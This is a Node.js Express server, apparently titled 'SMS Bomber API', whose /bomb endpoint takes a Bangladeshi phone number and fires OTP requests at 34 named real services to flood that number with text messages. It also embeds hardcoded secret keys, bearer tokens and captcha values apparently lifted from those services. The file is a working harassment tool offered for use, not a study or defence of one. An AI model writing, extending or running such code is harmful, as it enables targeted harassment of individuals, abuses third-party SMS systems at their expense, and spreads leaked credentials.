const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// Validate Bangladeshi number
const validateNumber = (number) => /^01[3-9]\d{8}$/.test(number);

// Root endpoint
app.get('/', (req, res) => {
    res.send('SMS Bomber API - Send GET to /bomb?number=017XXXXXXX');
});

// SMS Bombing Endpoint
app.get('/bomb', async (req, res) => {
    const number = req.query.number;
    
    if (!number || !validateNumber(number)) {
        return res.status(400).json({ 
            error: "Invalid Bangladeshi number (e.g., 01712345678)",
            usage: "https://your-api.vercel.app/bomb?number=017XXXXXXX"
        });
    }

    const targets = [
        // 1. Health Plus
        { 
            name: "Health Plus",
            url: 'https://api.healthplus.life/api/v6/otp-new', 
            method: 'POST', 
            data: { 
                msisdn: `880${number}`, 
                secretKey: "1e7c3d39ccc950368978ec3d60d493c53e9b4333e5ed626d033df0e5b90702e21f35c66ede56629af664b4ae341ced26" 
            } 
        },

        // 2. Osudpotro
        { 
            name: "Osudpotro",
            url: 'https://api.osudpotro.com/api/v1/users/send_otp', 
            method: 'POST', 
            data: { 
                mobile: `+88-${number}`, 
                deviceToken: "web", 
                language: "en", 
                os: "web" 
            } 
        },

        // 3. Bongo
        { 
            name: "Bongo",
            url: `https://accounts.bongobd.com/realms/bongo/login-actions/authenticate?session_code=WPugc4fz2GJ2J3dCg9SWphH5SSVhuwNYoPkMk3azMzo&execution=a8d40102-6986-4bd9-a122-99b1ea13f670&client_id=otplogin&tab_id=V4PkTgll0Qg&country=%2B880&phoneNumberPart=${number}&phone_number=%2B880${number}`, 
            method: 'POST' 
        },

        // 4. Cinematic
        { 
            name: "Cinematic",
            url: `https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/880${number}`, 
            method: 'POST',
            headers: {
                "Content-Type": "application/json",
                "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"
            }
        },

        // 5. Ali2BD
        { 
            name: "Ali2BD",
            url: 'https://edge.ali2bd.com/api/consumer/v1/auth/login', 
            method: 'POST', 
            data: { 
                username: `+880${number}` 
            } 
        },

        // 6. Admission BD
        { 
            name: "Admission BD",
            url: 'https://www.admissionbd.net/e-commerce-ajax-files/mobile-verify.php', 
            method: 'POST', 
            data: `PrimaryMobile=${number}&verify=1`,
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            }
        },

        // 7. Bikroy (GET)
        { 
            name: "Bikroy",
            url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${number}`, 
            method: 'GET' 
        },

        // 8. Chokro Jan
        { 
            name: "Chokro Jan",
            url: 'https://chokrojan.com/api/v1/passenger/login/mobile', 
            method: 'POST', 
            data: { 
                mobile_number: number 
            } 
        },

        // 9. Chorki
        { 
            name: "Chorki",
            url: 'https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en', 
            method: 'POST', 
            data: { 
                mobile_number: number 
            } 
        },

        // 10. DocTime
        { 
            name: "DocTime",
            url: 'https://api.doctime.com.bd/api/v2/authenticate', 
            method: 'POST', 
            data: { 
                country_calling_code: "88", 
                contact_no: number, 
                timestamp: Math.floor(Date.now()/1000) 
            } 
        },

        // 11. Med Easy
        { 
            name: "Med Easy",
            url: `https://api.medeasy.health/api/send-otp/+880${number}/`, 
            method: 'GET' 
        },

        // 12. Osud Kini
        { 
            name: "Osud Kini",
            url: 'https://api.osudkini.com/api/otp/generate-otp', 
            method: 'POST', 
            data: { 
                phoneNo: number 
            } 
        },

        // 13. The Mall BD
        { 
            name: "The Mall BD",
            url: 'https://themallbd.com/api/auth/otp_login', 
            method: 'POST', 
            data: { 
                phone_number: `+88${number}` 
            } 
        },

        // 14. Deepto Play
        { 
            name: "Deepto Play",
            url: 'https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en', 
            method: 'POST', 
            data: { 
                number: `+880${number}` 
            } 
        },

        // 15. Flipper
        { 
            name: "Flipper",
            url: 'https://portal.flipper.com.bd/api/v1/send-otp/login', 
            method: 'POST', 
            data: { 
                mobile_number: number 
            } 
        },

        // 16. Easy Fashion
        { 
            name: "Easy Fashion",
            url: 'https://easyfashion.com.bd/wp-admin/admin-ajax.php', 
            method: 'POST', 
            data: `action=digits_check_mob&countrycode=%2B880&mobileNo=${number}&csrf=ee19888073&login=2&digits=1`
        },

        // 17. Hishabee
        { 
            name: "Hishabee",
            url: 'https://web.hishabee.business/auth', 
            method: 'POST', 
            data: [{ 
                mobile_number: number 
            }] 
        },

        // 18. Jotno
        { 
            name: "Jotno",
            url: 'https://gw.jotno.net/auth/login/token', 
            method: 'POST', 
            data: { 
                userType: "CONSUMER", 
                username: number, 
                apiKey: "0cAFcWeA6KmF1xsgXPF9NEKEcZ7w0iZOioJ3msTYpiTJraggrQ24uhiQ1KK0yY1nXNRAw1AqbV0BoHVBz4Rd3pmDtncBUhHNRbp0kIjQholc1ws32D8TaPl9eLQ_H4dMwTXan3qrv2DE3RYlT22MgkpAv_KRZ_Ec3T6EanNAKbiM2ayk3ZF9yCjuggN3Tnp9hh1jsakEnBZn22dPqJ64GsM_diriYP-ljeouQInt9mL2Dn96c9B7LswGofeXy538gKuEf_Ml9dwrrSx3_NwMMF8rX-mExjCQxwlr2hsVIZTzVASSSjBk-GitDE9HDAXI9JQoomRteL0GKQ1IXXraL4kTuwvpjRvgPIZldoUm2PVIWvLUbl61EhSbdGTvgg4vI1D65bl1XAlwl_gdeohPAwLcaWYofDn7DvHqPSOpenya_lcavz47Gk90HxwD4OKIU98fA9ZFPXht62CA5d4mJ50xbhCppsCdapT5hJmXHKFxfUPDR6qTa25Y0BQZhdD-o4PpjRnFrMg-a9kZoZX6Z7CRxryYwRnifbKnJFa9vwR1ICR9WDHRPrdAUukCvOdjwzKYpuQ2wnPC1YDf__vQcNn4-KxWoYrA6S8KXVvGmvFIf_juBEfJunhVR5fKjLXjtN3EWdVYSf9vzeGEMyxSDK2hh307OGQOF9B8x2bPAYgawpb7MtW4GAI8o_iDt98bk3-bZNbAofrEoOvdeejNXl2H1KHv3wdXcLmt0DTa0ydl3yZz4Ynamz4fUbpqq-of6Jupq1JNqIyR9VtOMggonY9h3L302LO_0DZmC8wCvA9erSXXjb3OYtKs53NurCIOU9J7fnahFU9QikBpi7l6SxuR4vAiLyEjP8Fln5gqYmSs4h94hl9KR9DzuppfU94PofzzB4KVisUVoSOkS2Pg0dakJnqI7fRIRquyXKTVel0cid20lgXINWIY6reHgbcD9s84rP4v4xxfREEsD2djfVhjlBg-0TlliQ0Te_W5IzmfhojA748PJY1IEeQiWvEBuX8Aq9SfNiAG_AD7AMr0JhwG0R7kLOUQ2hCWn57FOY_lMyj0w5i93M0gyrn_9O2svWERJlmilam2CvVlOYK5EU8bsFlIhC7q2CJld3-hnJ47DNTermWsvWj7Xjji7JZaq7pKambBmyUduK6AmqO7eIVemxsaIvlGe-uLDqm06KamWQfjZ2_dfDgu-Z4uBknCq5uUJNi4JyiT6HhTqyaq5cOC-7v8Dwp6PID3g7L1bv4fBmQ_mgHhRJjm1UPDF_lntdOYxoKt7k6WF4N_Fhad_QvP2MkNkjAiWO0jfOgw1nRUn9WPYBL4Wr-uYqoHS2eXvTE03EYI354ODc4CIMH05ma3Qe4jjd9LS5jyDIw4SWBqQ3uMLaqFTZ8aXoGMlBJG15xJXl9PNyPbRhSrMPtzvrZH3EmJT8SsNXhdBmt7HDUc6uKluz9XiDBQpV69OzHpFfoRVfiBeDdvow4NCn2yV1NM0pnrtarI7_tUL8qWE9xsvh0OJzRl4q0RZ7a5lKGUl9xuMSuDBYNIgklwIpqxX8FmlpQmtJRLmaGa4JVxRp-2RCpXYNQJSsmFpoVQWHnMeBWMq53PMp4pDX" 
            } 
        },

        // 19. MoveOn
        { 
            name: "MoveOn",
            url: 'https://moveonbd.com/api/v1/customer/auth/phone/request-otp', 
            method: 'POST', 
            data: { 
                phone: number 
            } 
        },

        // 20. Shadhin Music
        { 
            name: "Shadhin Music",
            url: 'https://api.p4pay.shadhinmusic.com/grameenphone/dobbilling/send_otp', 
            method: 'POST', 
            data: { 
                msisdn: `880${number}`, 
                serviceId: "4003", 
                userCode: "6CC197A064" 
            } 
        },

        // 21. Rabbithole BD
        { 
            name: "Rabbithole BD",
            url: 'https://apix.rabbitholebd.com/appv2/login/requestOTP', 
            method: 'POST', 
            data: { 
                mobile: `+880${number}` 
            } 
        },

        // 22. Hoichoi
        { 
            name: "Hoichoi",
            url: 'https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code', 
            method: 'POST', 
            data: { 
                phoneNumber: `+880${number}` 
            } 
        },

        // 23. Apex
        { 
            name: "Apex",
            url: 'https://api.apex4u.com/api/auth/login', 
            method: 'POST', 
            data: { 
                phoneNumber: number 
            } 
        },

        // 24. BD Ticket
        { 
            name: "BD Ticket",
            url: 'https://api.bdtickets.com/v1/auth', 
            method: 'POST', 
            data: { 
                createUserCheck: true, 
                phoneNumber: `+880${number}`, 
                applicationChannel: "WEB_APP" 
            } 
        },

        // 25. Bus BD
        { 
            name: "Bus BD",
            url: 'https://api.busbd.com.bd/api/access-code', 
            method: 'POST', 
            data: { 
                phone: `+880${number}` 
            } 
        },

        // 26. Bioscope
        { 
            name: "Bioscope",
            url: 'https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en', 
            method: 'POST', 
            data: { 
                number: `+880${number}` 
            } 
        },

        // 27. Eon Bazar
        { 
            name: "Eon Bazar",
            url: 'https://app.eonbazar.com/api/auth/login', 
            method: 'POST', 
            data: { 
                method: "otp", 
                mobile: number 
            } 
        },

        // 28. Banglalink
        { 
            name: "Banglalink",
            url: 'https://web-api.banglalink.net/api/v1/user/otp-login/request', 
            method: 'POST', 
            data: { 
                mobile: number 
            } 
        },

        // 29. Robi
        { 
            name: "Robi",
            url: 'https://www.robi.com.bd/en', 
            method: 'POST', 
            data: [{ 
                msisdn: number 
            }] 
        },

        // 30. Airtel BD
        { 
            name: "Airtel BD",
            url: 'https://www.bd.airtel.com/en', 
            method: 'POST', 
            data: [{ 
                msisdn: number 
            }] 
        },

        // 31. Krikaya
        { 
            name: "Krikaya",
            url: 'https://feapi.sharky777.xyz/api/member/reqFgtPsw', 
            method: 'POST', 
            data: { 
                mobile: number.substring(2), 
                prefix: "+880", 
                captcha_id: "e59321b8-dbf5-4709-be98-7aa8b15caec0", 
                captcha_code: "1634" 
            } 
        },

        // 32. Bhaggo
        { 
            name: "Bhaggo",
            url: 'https://feapi.unicorn88.xyz/api/mobile/request', 
            method: 'POST', 
            data: { 
                membercode: "messi1019", 
                mobile: number.substring(2), 
                currency: "BDT", 
                request_otp: true, 
                captcha_id: "a0195153-f201-449f-86dc-50471c04b637", 
                captcha_code: "3951" 
            } 
        },

        // 33. Win2Gain
        { 
            name: "Win2Gain",
            url: `https://api.win2gain.com/api/Users/RequestOtp?msisdn=880${number}&otpEvent=SignUp`, 
            method: 'GET' 
        },

        // 34. Shomvob Job
        { 
            name: "Shomvob Job",
            url: 'https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0', 
            method: 'POST', 
            data: { 
                phone: `880${number}` 
            } 
        }
    ];

    const results = [];
    for (const target of targets) {
        try {
            const response = await axios({
                method: target.method,
                url: target.url,
                data: target.data,
                headers: target.headers || {}
            });
            results.push({ 
                service: target.name, 
                status: "Success ✅", 
                response: response.data 
            });
        } catch (error) {
            results.push({ 
                service: target.name, 
                status: "Failed ❌", 
                error: error.message 
            });
        }
    }

    res.json({ 
        success: true,
        number: number,
        total_apis: targets.length,
        results 
    });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
